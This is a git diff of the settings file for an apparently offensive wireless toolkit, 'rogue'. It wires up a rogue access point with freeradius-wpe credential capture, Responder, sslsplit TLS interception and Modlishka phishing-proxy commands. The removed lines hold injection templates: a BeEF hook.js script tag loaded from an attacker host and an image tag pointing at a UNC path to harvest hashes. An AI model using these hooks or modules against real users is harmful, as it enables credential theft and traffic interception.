@@ -3,7 +3,10 @@ import os
 import argparse
 
 # application version
-__version__ = "2.1.0"
+__version__ = "3.0.0"
+
+# application site
+__location__ = "https://rogue.infamoussyn.com/"
 
 # directory mapping
 root_dir, conf_file = os.path.split(os.path.abspath(__file__))
@@ -13,6 +16,7 @@ working_dir = root_dir + "/tmp"
 conf_dir = core_dir + "/config"
 lib_dir = core_dir + "/libs"
 templates_dir = root_dir + "/templates"
+hostapd_templates_dir = templates_dir + "/hostapd"
 
 # installation
 install_dir = root_dir + "/install"
@@ -47,7 +51,7 @@ rogue_auth_algs = 3
 rogue_macaddr_acl = 0
 rogue_default_eap_type = "md5"
 rogue_default_eap_types = ['fast','peap','ttls','tls','leap','pwd','md5','gtc']
-rogue_supported_eap_type = "md5"
+rogue_supported_eap_type = ["md5"]
 rogue_supported_eap_types = ['all','fast','peap','ttls','tls','leap','pwd','md5','gtc']
 rogue_country_options = ["AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU", "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO", "BQ", "BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK", "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO", "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB", "GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW", "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS", "IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ", "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF", "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX", "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA", "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO", "RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN", "SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL", "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC", "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW"]
 rogue_vht_index = 1
@@ -79,6 +83,7 @@ freeradius_bin = freeradius_dir + "/freeradius-wpe"
 freeradius_log = logdir + "/freeradius-wpe.log"
 freeradius_working_dir = "/etc/freeradius-wpe/3.0"
 freeradius_mods_dir = freeradius_working_dir + '/mods-available'
+freeradius_mods_enabled_dir = freeradius_working_dir + '/mods-enabled'
 freeradius_available_site_location = freeradius_working_dir + '/sites-available'
 freeradius_mods_dir_eap_full = freeradius_mods_dir + '/eap'
 freeradius_radiusd_full = freeradius_working_dir + '/radiusd.conf'
@@ -112,22 +117,8 @@ default_max_lease_time = 7200
 default_primary_name_server = "8.8.8.8"
 default_secondary_name_server = "8.8.4.4"
 
-# httpd settings
-http_dir = "/etc/apache2"
-http_sites_available = http_dir + "/sites-available"
-http_sites_enabled = http_dir + "/sites-enabled"
-http_name_conf = "000-rogue.conf"
-http_conf_full = http_sites_available + "/" + http_name_conf
-http_port = 80
-http_ssl_port = 443
-http_error_log = "{" + "APACHE_LOG_DIR" + "}"
-http_custom_log = "{" + "APACHE_LOG_DIR" + "}"
-http_root = '/var/www/html'
-
 ## Attack configs
-
-# httrack configuration
-httrack_dest = http_root
+supported_attack_modules = ['responder', 'modlishka', 'sslsplit']
 
 # sslsplit
 ca_key = certs_dir + "/ca_no_pass.key"
@@ -139,47 +130,39 @@ sslsplit_encrypted_port = 8443
 sslsplit_cmd = "-d -l %s -j %s -S %s -k %s -c %s ssl 0.0.0.0 %d"
 
 # responder
-responder_bin = '/usr/bin/responder'
-responder_cmd = '-I %s -rf 2>&1'
+responder_bin = '/usr/sbin/responder'
+responder_cmd = '-I %s 2>&1'
 responder_conf = '/etc/responder/Responder.conf'
-responder_hook = '<img src="\\\\%s\\hook">\n'
 
-# Beef framework
-beef_hook = "<script src='http://%s:3000/hook.js'></script>\n"
-
-# Hostile portal
-hostile_target_file="/index.html"
-hostile_insert_marker ='</body>\n'
-
-# tcpdump
-tcpdump_logdir = logdir
-tcpdump_cmd = "-i %s -w %s"
+# modlishka
+modlishka_cmd = '-proxyDomain %s -proxyAddress %s -controlURL %s -controlCreds %s -listeningAddress %s -target %s'
+modlishka_proxydomain = 'loopback.modlishka.io'
+modlishka_listeningaddress = default_ip_address
+modlishka_proxyaddress = None
+modlishka_controlURL = 'rogue'
+modlishka_controlCreds = 'rogue:rogue'
 
 # service configs
 use_systemd = True
 network_manager = "network-manager"
 network_manager_bin = None
-tcpdump_bin = "/usr/sbin/tcpdump"
 dhcp_server = "isc-dhcp-server"
 dhcp_server_bin = None
-httpd = "apache2"
-httpd_bin = None
 wpa_supplicant = "wpa_supplicant"
 wpa_supplicant_bin = None
-beef = "beef-xss"
-httrack_bin = "/usr/bin/httrack"
+mysql_service = 'mysql'
+mysql_bin = None
 sslsplit_bin = "/usr/bin/sslsplit"
+modlishka_bin = "/home/kali/go/bin/Modlishka"
 
 
 # don't touch these
 wlan_clean_sleep = 1
 generic_sleep = 3
-httpd_sleep = generic_sleep
-tcpdump_sleep = generic_sleep
 hostapd_sleep = 4
 freeradius_sleep = 4
+mysql_sleep = 3
 sslsplit_sleep = 4
-beef_sleep = 4
 responder_sleep = 4
 network_manager_sleep = 4
 dhcp_server_sleep = 4
